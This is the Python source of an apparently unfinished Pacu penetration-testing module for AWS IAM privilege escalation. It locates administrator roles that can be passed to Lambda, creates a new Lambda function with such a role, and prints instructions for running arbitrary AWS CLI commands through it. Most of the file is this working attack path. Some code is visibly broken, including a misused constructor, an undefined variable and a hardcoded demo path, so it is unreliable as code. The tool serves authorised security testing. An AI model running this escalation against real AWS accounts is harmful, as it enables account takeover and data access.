#!/usr/bin/env python3
import argparse
import typing
from typing import List

from botocore.exceptions import ClientError
import string
from copy import deepcopy
import json
import os
import re
import random
import time
import subprocess

from principalmapper.analysis.finding import Finding
from principalmapper.common import Graph, Node
from principalmapper.graphing import graph_actions
from principalmapper.querying import query_interface
from principalmapper.querying.presets import privesc, connected
from principalmapper.util import arns

from utils import remove_empty_from_dict

module_info = {
    # Name of the module (should be the same as the filename)
    'name': 'iam__privesc_scan_v2',

    # Name and any other notes about the author
    'author': 'Spencer Gietzen of Rhino Security Labs',

    # Category of the module. Make sure the name matches an existing category.
    'category': 'ESCALATE',

    # One liner description of the module functionality. This shows up when a user searches for modules.
    'one_liner': 'An IAM privilege escalation path finder and abuser.',

    # Description about what the module does and how it works
    'description': 'This module will scan for permission misconfigurations to see where privilege escalation will be possible. Available attack paths will be presented to the user and executed on if chosen. Warning: Due to the implementation in IAM policies, this module has a difficult time parsing "NotActions". If your user has any NotActions associated with them, it is recommended to manually verify the results of this module. NotActions are noted with a "!" preceeding the action when viewing the results of the "whoami" command. For more information on what NotActions are, visit the following link: https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_elements_notaction.html\n',

    # A list of AWS services that the module utilizes during its execution
    'services': ['IAM', 'EC2', 'Glue', 'Lambda', 'DataPipeline', 'DynamoDB', 'CloudFormation'],

    # For prerequisite modules, try and see if any existing modules return the data that is required for your module before writing that code yourself, that way, session data can stay separated and modular.
    'prerequisite_modules': [
        'iam__enum_permissions',
        'iam__enum_users_roles_policies_groups',
        'iam__backdoor_users_keys',
        'iam__backdoor_users_password',
        'iam__backdoor_assume_role',
        'glue__enum',
        'lambda__enum',
    ],

    # Module arguments to autocomplete when the user hits tab
    'arguments_to_autocomplete': ['--offline', '--folder', '--scan-only'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--offline', required=False, default=False, action='store_true',
                    help='By passing this argument, this module will not make an API calls. If offline mode is enabled, you need to pass a file path to a folder that contains JSON files of the different users, policies, groups, and/or roles in the account using the --folder argument. This module will scan those JSON policy files to identify users, groups, and roles that have overly permissive policies.')
parser.add_argument('--folder', required=False, default=None,
                    help='A file path pointing to a folder full of JSON files containing policies and connections between users, groups, and/or roles in an AWS account. The module "iam__enum_permissions" with the "--all-users" flag outputs the exact format required for this feature to ./sessions/[current_session_name]/downloads/confirmed_permissions/.')
parser.add_argument('--scan-only', required=False, default=False, action='store_true',
                    help='Only run the scan to check for possible escalation methods, don\'t attempt any found methods.')


# 18) GreenGrass passrole privesc ?
# 19) Redshift passrole privesc ?
# 20) S3 passrole privesc ?
# 21) ServiceCatalog passrole privesc ?
# 22) StorageGateway passrole privesc ?


def main(args, pacu_main):
    session = pacu_main.get_active_session()

    ###### Don't modify these. They can be removed if you are not using the function.
    args = parser.parse_args(args)
    print = pacu_main.print
    input = pacu_main.input
    key_info = pacu_main.key_info
    fetch_data = pacu_main.fetch_data
    ######

    summary_data = {'scan_only': args.scan_only}

    # TODO: Check for these permissions
    escalation_methods = {
        'EditExistingLambdaFunctionWithRole': {
            'lambda:UpdateFunctionCode': True,  # Edit existing Lambda functions
            'lambda:ListFunctions': False,  # Find existing Lambda functions
            'lambda:InvokeFunction': False  # Invoke it afterwards
        },
        'PassExistingRoleToNewLambdaThenInvoke': {
            'iam:PassRole': True,  # Pass the role to the Lambda function
            'lambda:CreateFunction': True,  # Create a new Lambda function
            'lambda:InvokeFunction': True,  # Invoke the newly created function
            'iam:ListRoles': False  # Find a role to pass
        },
    }


    root = 'sessions/demo/pmmapper'
    graph = graph_actions.get_graph_from_disk(root)

    user = key_info()

    if user["UserName"]:
        source_name = 'user/{}'.format(user["UserName"])
    elif user["RoleName"]:
        source_name = 'role/{}'.format(user["RoleName"])
    else:
        raise UserWarning("No current user or role found")

    source_node = graph.get_node_by_searchable_name(source_name)

    results : List[PacuFinding] = []
    results.extend(gen_overprivileged_function_findings(source_node, graph))

    for result in results:
        summary_data[result.title] = result.exploit(pacu_main, print, input, fetch_data)

    return summary_data

# Mostly copied from an example for now
def gen_overprivileged_function_findings(src_node: Node, graph: Graph) -> List[Finding]:
    """Generates findings related to risk from Lambda functions being loaded with overprivileged roles"""
    result = []
    affected_roles = []

    for dst_node in graph.nodes:
        if ':role/' in dst_node.arn and dst_node.is_admin:
            resource_policy = query_interface.resource_policy_authorization('lambda.amazonaws.com', arns.get_account_id(src_node.arn),
                                                             src_node.trust_policy, 'sts:AssumeRole', dst_node.arn, {}, False)

            if resource_policy == query_interface.ResourcePolicyEvalResult.SERVICE_MATCH:

                # Check if we have direct access with the current key or need to run iam__pivot first
                valid, edges = connected.is_connected(graph, source_node=src_node, dest_node=dst_node)
                if valid and len(edges) == 1:
                    affected_roles.append(dst_node)
                elif valid:
                    print("Use iam__pivot to change to the role {} and run this again".format(dst_node.arn))

    if len(affected_roles) > 0:
        description_preamble = 'In AWS, Lambda functions can be assigned an IAM Role to use during execution. These ' \
                               'IAM Roles give the function access to call the AWS API with the permissions of the ' \
                               'IAM Role, depending on the policies attached to it. If the Lambda function can be ' \
                               'compromised, and the attacker can alter the code it executes, the attacker could ' \
                               'make AWS API calls with the IAM Role\'s permissions. The following IAM Roles have ' \
                               'administrative privileges, and can be passed to Lambda functions:\n\n'

        description_body = ''
        for node in affected_roles:
            description_body += '* {}\n'.format(node.searchable_name())

        result.append(PacuFinding(
            'IAM Role Available to Lambda Functions Has Administrative Privileges',
            'Medium',
            'If an attacker can inject code or commands into the function, or if a lower-privileged principal can '
            'alter the function, the AWS account as a whole could be compromised.',
            description_preamble + description_body,
            PassExistingRoleToNewLambdaThenInvoke,
            'Reduce the scope of permissions attached to the noted IAM Role(s).'
        ))

    return result

class PacuFinding(Finding):
    def __init__(self, title: str, severity: str, impact: str, description: str, exploit: typing.Callable, recommendation: str):
        super()
        self.exploit = exploit

    def exploit(self):
        self.exploit()

def summary(data, pacu_main):
    print()
    if data['scan_only']:
        return '  Scan Complete'
    elif 'offline' in data and data['offline']:
        return '  Completed offline scan of:\n    ./{}\n\n  Results stored in:\n    {}'.format(
            data['offline']['scanned_dir'], data['offline']['output_file'])
    else:
        if 'success' in data and data['success']:
            out = '  Privilege escalation was successful'
        else:
            out = '  Privilege escalation was not successful'
    return out

def PassExistingRoleToNewLambdaThenInvoke(pacu_main, print, input, fetch_data):
    print('  Starting method PassExistingRoleToNewLambdaThenInvoke...\n')

    try:
        function_name, region = pass_existing_role_to_lambda(pacu_main, print, input, fetch_data)
        print('To make use of the new privileges, you need to invoke the newly created function. The function accepts input in the format as follows:\n\n{"cmd": "<aws cli command>"}\n\nWhen invoking the function, pass that JSON object as input, but replace <aws cli command> with an AWS CLI command that you would like to execute in the context of the role that was passed to this function.\n\nAn example situation would be where the role you passed has S3 privileges, so you invoke this newly created Lambda function with the input {"cmd": "aws s3 ls"} and it will respond with all the buckets in the account.\n')
        print('Example AWS CLI command to invoke the new Lambda function and execute "aws s3 ls" can be seen here:\n')
        print('aws lambda invoke --function-name {} --region {} --payload file://payload.json --profile CurrentAWSKeys Out.txt\n'.format(function_name, region))
        print('The file "payload.json" would include this object: {"cmd": "aws s3 ls"}. The results of the API call will be stored in ./Out.txt as well.\n')
        return True
    except Exception as error:
        print('Failed to create a new Lambda function: {}\n'.format(error))
        return False

def pass_existing_role_to_lambda(pacu_main, print, input, fetch_data, zip_file='', region=None):
    session = pacu_main.get_active_session()

    if zip_file == '':
        zip_file = './modules/{}/lambda.zip'.format(module_info['name'])

    if region is None:
        regions = pacu_main.get_regions('lambda')

        if len(regions) > 1:
            print('  Found multiple valid regions to use. Choose one below.\n')
            for i in range(0, len(regions)):
                print('  [{}] {}'.format(i, regions[i]))
            choice = input('  What region do you want to create the Lambda function in? ')
            region = regions[int(choice)]
        elif len(regions) == 1:
            region = regions[0]
        else:
            while not region:
                all_lambda_regions = pacu_main.get_regions('lambda', check_session=False)
                region = input(
                    '  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: ')
                if not region:
                    return False
                elif region not in all_lambda_regions:
                    print(
                        '    Region {} is not a valid Lambda region. Please choose a valid region. Valid Lambda regions include:\n'.format(
                            region))
                    print(all_lambda_regions)
                    region = None

    client = pacu_main.get_boto3_client('lambda', region)

    target_role_arn = input(
        '  Is there a specific role to use? Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: ')

    if not target_role_arn:
        if fetch_data(['IAM', 'Roles'], module_info['prerequisite_modules'][1], '--roles', force=True) is False:
            print('Pre-req module not run successfully. Exiting...')
            return False
        roles = deepcopy(session.IAM['Roles'])

        print('Found {} roles. Choose one below.'.format(len(roles)))
        for i in range(0, len(roles)):
            print('  [{}] {}'.format(i, roles[i]['RoleName']))
        choice = input('Choose an option: ')
        target_role_arn = roles[int(choice)]['Arn']

    print('Using role {}. Trying to create a new Lambda function...\n'.format(target_role_arn))

    function_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))

    with open(zip_file, 'rb') as f:
        lambda_zip = f.read()

    # Put the error handling in the function calling this function
    client.create_function(
        FunctionName=function_name,
        Runtime='python3.6',
        Role=target_role_arn,
        Code={
            'ZipFile': lambda_zip
        },
        Timeout=30,
        Handler='lambda_function.lambda_handler'
    )
    print('Successfully created a Lambda function {} in region {}!\n'.format(function_name, region))
    return (function_name, region)


